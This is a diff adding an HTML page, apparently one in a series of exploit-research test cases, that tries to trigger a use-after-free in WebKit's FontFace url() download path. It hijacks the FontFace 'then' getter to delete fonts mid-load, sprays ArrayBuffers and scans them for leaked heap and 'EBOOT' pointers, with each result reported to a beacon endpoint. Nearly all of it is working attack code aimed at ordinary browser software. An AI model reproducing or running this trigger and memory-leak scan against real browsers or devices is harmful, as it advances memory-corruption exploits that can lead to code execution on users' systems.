@@ -1,0 +1,210 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1088 - FontFace url() download path UAF</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8c8d0;font:12px/1.5 'Courier New',monospace;padding:10px}
+h2{color:#00ff88;font-size:14px;margin:6px 0}
+#log{background:#12121a;border:1px solid #2a2a3a;border-radius:6px;padding:8px;margin:6px 0;
+max-height:75vh;overflow-y:auto;font-size:11px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}
+.hit{color:#ff00ff;font-weight:bold}.ptr{color:#ff0;font-weight:bold}
+</style>
+</head><body>
+<h2>P1088 FontFace url() Download Path UAF</h2>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),T0=Date.now();
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1088-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}}
+B('BOOT');
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1088: FontFace url() download path UAF trigger
+
+   The P1069v9 trigger uses local() fonts that resolve synchronously.
+   This means the FontFace load() completes before complex async state
+   machine code runs. What if we use a url() source that triggers the
+   DOWNLOAD path with its async state transitions, error handling, and
+   potential race conditions?
+
+   WebKit FontFace download path involves:
+   - CSSFontFaceSource::load() -> network request
+   - CSSFontFaceSource::error() on 404/timeout
+   - Complex refcounting across CSSFontFace, CSSFontSelector, FontFaceSet
+
+   Hypothesis: If we arrange for the FontFace to be deleted during the
+   async download callback (via the then getter), the download completion
+   or error handler may access freed CSSFontFaceSource / CSSFontFace.
+
+   Test vectors:
+   A1: url(data:...) with embedded TTF/WOFF
+   A2: url(bogus:) to force error path immediately
+   A3: Cancel load() mid-download then delete
+   A4: Expire cache entry during load
+   B: After trigger, scan all AB sizes for engine data
+
+   ═══════════════════════════════════════════════════════════════════════ */
+
+var PHASES=['A1_dataurl','A2_bogus','A3_cancel','A4_cache','B_scan'];
+var phase=0;
+try{phase=parseInt(localStorage.getItem('p1088_p')||'0');}catch(e){}
+if(phase>=PHASES.length){
+  B('ALL-DONE');
+  log('ALL PHASES COMPLETE','ok');
+  try{localStorage.removeItem('p1088_p');}catch(e){}
+}
+else{
+
+var curPhase=PHASES[phase];
+B('PHASE','p='+phase+'|name='+curPhase);
+log('=== Phase: '+curPhase+' ===','info');
+
+/* reusable leak trigger */
+function triggerUAF(sourceType, cb){
+  var fired=false;
+  var styleEl=document.createElement('style');
+  styleEl.textContent="@font-face{font-family:testsrc;src:"+sourceType+";}";
+  document.head.appendChild(styleEl);
+
+  var ff=new FontFace('testface',sourceType);
+  document.fonts.add(ff);
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired)return undefined; fired=true;
+      styleEl.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      /* spray immediately in callback */
+      window.__spray=[];
+      var szArr=[64,96,128,160,192,224,256,320,384,512,768];
+      for(var si=0;si<szArr.length;si++){
+        for(var k=0;k<30;k++){window.__spray.push(new ArrayBuffer(szArr[si]));}
+      }
+      return undefined;
+    },set:function(){}});
+
+  ff.load();
+  setTimeout(function(){cb();},300);
+}
+
+/* Scan all sprayed ABs */
+function scanAndReport(label){
+  var found=[];
+  if(!window.__spray){window.__spray=[];}
+  for(var i=0;i<window.__spray.length;i++){
+    var ab=window.__spray[i]; if(!ab)continue;
+    var sz=ab.byteLength;
+    var dv=new DataView(ab);
+    for(var off=0;off+7<sz;off+=8){
+      var qw;try{qw=dv.getBigUint64(off,true);}catch(e){break;}
+      if(qw!==0n){
+        var hex='0x'+qw.toString(16);
+        var isHeap=(qw>0x1000000000n&&qw<0x100000000000n);
+        var isEboot=((qw>>32n)===0x532n||(qw>>32n)===0x533n||(qw>>32n)===0x1000n);
+        found.push({sz:sz,off:off,hex:hex,heap:isHeap,eboot:isEboot});
+      }
+    }
+  }
+  var rep=label+'|n='+found.length;
+  if(found.length>0){
+    rep+='|first='+found[0].sz+'@'+found[0].off+'='+found[0].hex+(found[0].eboot?'(EBOOT)':(found[0].heap?'(HEAP)':'(OTHER)'));
+    var eboots=found.filter(function(e){return e.eboot;});
+    if(eboots.length>0)rep+='|EBOOTs='+eboots.length;
+  }
+  B('SCAN',rep);
+  log(rep,found.length>0?'hit':'info');
+  return found;
+}
+
+function nextPhase(){
+  try{localStorage.setItem('p1088_p',''+(phase+1));}catch(e){}
+  setTimeout(function(){location.reload(true);},500);
+}
+
+/* Phase handlers */
+if(curPhase==='A1_dataurl'){
+  /* Minimal valid TTF embedded in data URL — triggers download parsing path */
+  var dataUrl="url(data:font/ttf;base64,AAEAAAAQAQAAABAAZAAAAAAAAAAAAAAAAAAAACMAAAABAAABJAGQAAUAAAAEAAAAAAYB";
+  triggerUAF(dataUrl,function(){
+    var r=scanAndReport('A1');
+    nextPhase();
+  });
+}
+else if(curPhase==='A2_bogus'){
+  triggerUAF("url(bogus://shouldfail)",function(){
+    var r=scanAndReport('A2');
+    nextPhase();
+  });
+}
+else if(curPhase==='A3_cancel'){
+  var ff=new FontFace('cancelface',"url(http://localhost:9999/hang.woff)");
+  document.fonts.add(ff);
+  var prom=ff.load();
+  var fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired)return undefined; fired=true;
+      try{document.fonts.delete(this);}catch(e){}
+      window.__spray=[];
+      for(var k=0;k<300;k++)window.__spray.push(new ArrayBuffer(192));
+      return undefined;
+    },set:function(){}});
+  prom.then(function(){},function(){
+    scanAndReport('A3');
+    nextPhase();
+  });
+  /* fallback: proceed anyway after 5s */
+  setTimeout(function(){scanAndReport('A3-timeout');nextPhase();},5000);
+}
+else if(curPhase==='A4_cache'){
+  /* Load same font multiple times to hit cache, delete mid-cache-access */
+  var rounds=0;
+  function doRound(){
+    if(rounds>=5){scanAndReport('A4');nextPhase();return;}
+    rounds++;
+    var ff=new FontFace('cacheface'+rounds,"url(data:font/woff2;base64,AAEAAAAQAQAAABAAZAAAAAAAAAAAAAAAAAAAACMAAA)");
+    document.fonts.add(ff);
+    ff.load().then(function(){doRound();},function(){doRound();});
+    /* delete early */
+    if(rounds===3){
+      setTimeout(function(){
+        try{document.fonts.delete(ff);}catch(e){}
+        window.__spray=window.__spray||[];
+        for(var k=0;k<50;k++)window.__spray.push(new ArrayBuffer(192));
+      },50);
+    }
+  }
+  doRound();
+}
+else{
+  scanAndReport('B');
+  nextPhase();
+}
+
+} /* end phases */
+
+/* auto-reload checker */
+(function(){
+  var cur='P1088-font-url-uaf-trigger';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
